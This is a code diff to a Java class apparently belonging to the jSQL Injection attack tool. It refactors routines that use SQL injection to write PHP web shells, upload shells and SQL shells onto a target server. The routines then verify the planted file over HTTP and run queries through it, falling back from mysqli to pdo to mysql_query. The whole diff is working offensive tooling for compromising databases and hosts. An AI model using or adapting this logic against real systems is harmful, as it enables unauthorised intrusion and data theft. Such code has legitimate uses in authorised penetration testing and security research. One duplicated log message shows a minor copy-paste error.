@@ -26,7 +26,10 @@ import org.apache.commons.lang3.StringUtils;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
-import java.io.*;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.IOException;
+import java.io.InputStream;
 import java.net.URI;
 import java.net.URLEncoder;
 import java.net.http.HttpHeaders;
@@ -40,9 +43,12 @@ import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.time.Duration;
 import java.util.*;
-import java.util.concurrent.*;
-import java.util.function.BiConsumer;
+import java.util.concurrent.CompletionService;
+import java.util.concurrent.ExecutionException;
+import java.util.concurrent.ExecutorCompletionService;
+import java.util.concurrent.ExecutorService;
 import java.util.function.BiFunction;
+import java.util.function.BiPredicate;
 import java.util.regex.Pattern;
 
 /**
@@ -179,17 +185,18 @@ public class ResourceAccess {
     }
 
     public String createExploitWeb(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod) throws JSqlException {
-        BiConsumer<String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+        BiFunction<String, String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             var request = new Request();
             request.setMessage(Interaction.ADD_TAB_EXPLOIT_WEB);
             request.setParameters(urlSuccess);
             this.injectionModel.sendToViews(request);
+            return urlSuccess;
         };
         return this.createExploit(pathExploit, urlExploit, "exploit.web", "web.php", biFuncGetRequest, pathNetshare, exploitMethod);
     }
 
     public void createExploitUpload(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, File fileToUpload) throws JSqlException {
-        BiConsumer<String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+        BiFunction<String, String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
             try (InputStream streamToUpload = new FileInputStream(fileToUpload)) {
                 HttpResponse<String> result = this.upload(fileToUpload, urlSuccess, streamToUpload);
                 if (result.body().contains(DataAccess.LEAD + "y")) {
@@ -197,27 +204,42 @@ public class ResourceAccess {
                 } else {
                     LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Upload failure: missing ack for {}{}", pathExploit, fileToUpload.getName());
                 }
-            } catch (IOException | JSqlException | InterruptedException e) {
+            } catch (InterruptedException e) {
+                LOGGER.log(LogLevelUtil.IGNORE, e, e);
+                Thread.currentThread().interrupt();
+            } catch (IOException | JSqlException e) {
                 throw new JSqlRuntimeException(e);
             }
+            return urlSuccess;
         };
         this.createExploit(pathExploit, urlExploit, "exploit.upl", "upl.php", biFuncGetRequest, pathNetshare, exploitMethod);
     }
 
     public String createExploitSql(String pathExploit, String urlExploit, String pathNetshare, ExploitMethod exploitMethod, String username, String password) throws JSqlException {
-        BiConsumer<String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
-            var request = new Request();
-            request.setMessage(Interaction.ADD_TAB_EXPLOIT_SQL);
-            request.setParameters(urlSuccess, username, password);
-            this.injectionModel.sendToViews(request);
+        BiFunction<String, String, String> biFuncGetRequest = (String pathExploitFixed, String urlSuccess) -> {
+            var resultQuery = this.runSqlShell("select 1337", null, urlSuccess, username, password, false);
+            if (resultQuery != null && resultQuery.contains("| 1337 |")) {
+                var request = new Request();
+                request.setMessage(Interaction.ADD_TAB_EXPLOIT_SQL);
+                request.setParameters(urlSuccess, username, password);
+                this.injectionModel.sendToViews(request);
+                return urlSuccess;
+            }
+            return StringUtils.EMPTY;
         };
-        // todo PDO
-        var nameExploitValidated = this.createExploit(pathExploit, urlExploit, "exploit.sql.php7", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
-        if (StringUtils.isEmpty(nameExploitValidated)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit failure with php7, retrying with lower version...");
-            nameExploitValidated = this.createExploit(pathExploit, urlExploit, "exploit.sql", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
+        var urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.mysqli", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
+        if (StringUtils.isEmpty(urlSuccess)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with mysqli_query(), trying with pdo()...");
+            urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.pdo", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
         }
-        return nameExploitValidated;
+        if (StringUtils.isEmpty(urlSuccess)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with pdo(), trying with mysql_query()...");
+            urlSuccess = this.createExploit(pathExploit, urlExploit, "exploit.sql.mysql", "sql.php", biFuncGetRequest, pathNetshare, exploitMethod);
+        }
+        if (StringUtils.isEmpty(urlSuccess)) {
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Failure with pdo(), trying with mysql_query()...");
+        }
+        return urlSuccess;
     }
 
     /**
@@ -229,7 +251,7 @@ public class ResourceAccess {
         String urlExploit,
         String keyPropertyExploit,
         String nameExploit,
-        BiConsumer<String, String> biFuncGetRequest,
+        BiFunction<String, String, String> biFuncGetRequest,
         String pathNetshareFolder,
         ExploitMethod exploitMethod
     ) throws JSqlException {
@@ -244,7 +266,7 @@ public class ResourceAccess {
         .replace(DataAccess.SHELL_TRAIL, DataAccess.TRAIL);
 
         // outfile + binary: content corruption
-        BiFunction<String, String, Boolean> funcConfirm = (String pathFolder, String nameFile) -> {
+        BiPredicate<String, String> biPredConfirm = (String pathFolder, String nameFile) -> {
             try {
                 String resultInjection = this.confirmExploit(pathFolder + nameFile);
                 return resultInjection.contains(bodyExploit);
@@ -263,7 +285,7 @@ public class ResourceAccess {
                 pathNetshareFolder,
                 nameExploit,
                 pathRemoteFolder,
-                funcConfirm
+                biPredConfirm
             );
         } else if (exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.QUERY_BODY) {
             nameExploitValidated = this.injectionModel.getUdfAccess().byQueryBody(
@@ -271,7 +293,7 @@ public class ResourceAccess {
                 pathRemoteFolder,
                 nameExploit,
                 UdfAccess.toHexChunks(bodyExploit.getBytes()),
-                funcConfirm
+                biPredConfirm
             );
         }
         if (StringUtils.isEmpty(nameExploitValidated) && exploitMethod == ExploitMethod.AUTO || exploitMethod == ExploitMethod.TEMP_TABLE) {
@@ -280,23 +302,22 @@ public class ResourceAccess {
                 UdfAccess.toHexChunks(bodyExploit.getBytes()),
                 pathRemoteFolder + nameExploitRandom
             );
-            if (funcConfirm.apply(pathRemoteFolder, nameExploitRandom)) {
+            if (biPredConfirm.test(pathRemoteFolder, nameExploitRandom)) {
                 nameExploitValidated = nameExploitRandom;
             }
         }
 
         if (StringUtils.isEmpty(nameExploitValidated)) {
-            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit creation failure: source file not found at [{}]", pathRemoteFolder + nameExploitValidated);
+            LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit creation failure: source file not found at [{}{}]", pathRemoteFolder, nameExploitValidated);
             return null;
         }
         nameExploit = nameExploitValidated;
-        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit creation successful: source file found at [{}]", pathRemoteFolder + nameExploitValidated);
+        LOGGER.log(LogLevelUtil.CONSOLE_SUCCESS, "Exploit creation successful: source file found at [{}{}]", pathRemoteFolder, nameExploitValidated);
 
-        this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
-        return nameExploitValidated;
+        return this.checkUrls(urlExploit, nameExploit, biFuncGetRequest);
     }
 
-    private void checkUrls(String urlExploit, String nameExploit, BiConsumer<String, String> biFuncGetRequest) {
+    private String checkUrls(String urlExploit, String nameExploit, BiFunction<String, String, String> biFuncGetRequest) {
         String urlExploitFixed = urlExploit;
         if (!urlExploitFixed.isEmpty()) {
             urlExploitFixed = urlExploitFixed.replaceAll("/*$", StringUtils.EMPTY) +"/";
@@ -323,10 +344,11 @@ public class ResourceAccess {
         }
         String urlSuccess = this.getExploitUrl(nameExploit, directoryNames, urlProtocol);
         if (urlSuccess != null) {
-            biFuncGetRequest.accept(nameExploit, urlSuccess);
+            urlSuccess = biFuncGetRequest.apply(nameExploit, urlSuccess);
         } else {
             LOGGER.log(LogLevelUtil.CONSOLE_ERROR, "Exploit access failure: URL not found");
         }
+        return urlSuccess;
     }
 
     private static void copyToShare(String pathFile, String bodyExploit) throws JSqlException {
@@ -443,6 +465,10 @@ public class ResourceAccess {
      * @param password password [optional]
      */
     public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password) {
+        return this.runSqlShell(command, uuidShell, urlExploit, username, password, true);
+    }
+
+    public String runSqlShell(String command, UUID uuidShell, String urlExploit, String username, String password, boolean isWithView) {
         String result = this.runCommandShell(String.format(
              "%s?q=%s&u=%s&p=%s",
              urlExploit,
@@ -465,10 +491,12 @@ public class ResourceAccess {
             result = result.replace("<SQLe>", StringUtils.EMPTY) + "\n";
         }
 
-        var request = new Request();  // Unfroze interface
-        request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
-        request.setParameters(uuidShell, result, command);
-        this.injectionModel.sendToViews(request);
+        if (isWithView) {
+            var request = new Request();  // Unfroze interface
+            request.setMessage(Interaction.GET_EXPLOIT_SQL_RESULT);
+            request.setParameters(uuidShell, result, command);
+            this.injectionModel.sendToViews(request);
+        }
         return result;
     }
 
